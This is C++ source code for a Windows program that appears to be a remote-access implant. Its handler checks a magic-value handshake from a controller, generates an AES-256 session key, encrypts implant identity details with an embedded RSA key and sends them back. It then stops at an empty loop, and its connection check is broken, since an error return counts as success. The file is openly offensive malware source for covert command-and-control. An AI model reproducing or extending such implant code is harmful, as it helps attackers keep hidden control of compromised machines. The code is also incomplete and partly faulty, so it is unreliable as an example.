#include <Windows.h>
#include <vector>
#include <globalvars.h>
#include <string> 
#include <rsa.h>
#include <AES.h>
#include <random>

extern CONFIG g_conf;
unsigned char pubkey[283] = { 'R','S','A','1' };

BOOL check_connection(int bytes) {
	if (bytes == -1) {
		return -1;
	}
	else if (bytes == 0) {
		return -1;
	}
	return 1;
}

std::vector<UCHAR> geneate_random(int len) {
	std::random_device engine;
	std::vector<UCHAR> array;
	for (int i = 0; i < len; i++) {
		array.push_back(engine());
	}
	return array;
}
void main_dispatcher(SOCKET client_socket) {
	BCRYPT_ALG_HANDLE hAlgorithm = 0;
	BCRYPT_KEY_HANDLE key = 0;

	sockaddr_in client;
	int client_size = sizeof(client);

	BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
	import_pubkey(hAlgorithm, (unsigned char*)pubkey, sizeof(pubkey), &key);

	HELLOREQUEST inital_request;
	int recv_bytes = recv(client_socket, (char*)&inital_request, sizeof(HELLOREQUEST), 0);
	if (check_connection(recv_bytes))
	{
		ULONG magic_val1 = inital_request.val1;
		ULONG magic_val2 = inital_request.val2;
		
		if (magic_val1 + magic_val2 == MAGIC_VALUE)
		{
			IMPLANTINFO implant_information;
			HELLORESPONSE inital_response;

			std::vector<UCHAR> aes_key = geneate_random(32);
			std::vector<UCHAR> iv = geneate_random(16);

			AES aes(AESKeyLength::AES_256);
			implant_information.implant_arch = IMPLANT_ARCH;
			implant_information.platform_arch = 0x8;
			implant_information.implant_id = g_conf.id;
			implant_information.implant_platform = 0x8;
			implant_information.implant_version = IMPLANT_VERSION;
			memcpy(implant_information.session_key, aes_key.data(), aes_key.size());

			PUCHAR encrypted_implant_info;
			ULONG encrypted_implant_info_length;
			encrypt_data(key, (unsigned char*)&implant_information, sizeof(IMPLANTINFO), encrypted_implant_info, encrypted_implant_info_length);
			memcpy(inital_response.implant_info, encrypted_implant_info, encrypted_implant_info_length);
			memcpy(inital_response.next_iv, iv.data(), iv.size());

			send(client_socket, (const char*)&inital_response, sizeof(HELLORESPONSE), 0);
		}
	}

	while (true)
	{
	}
}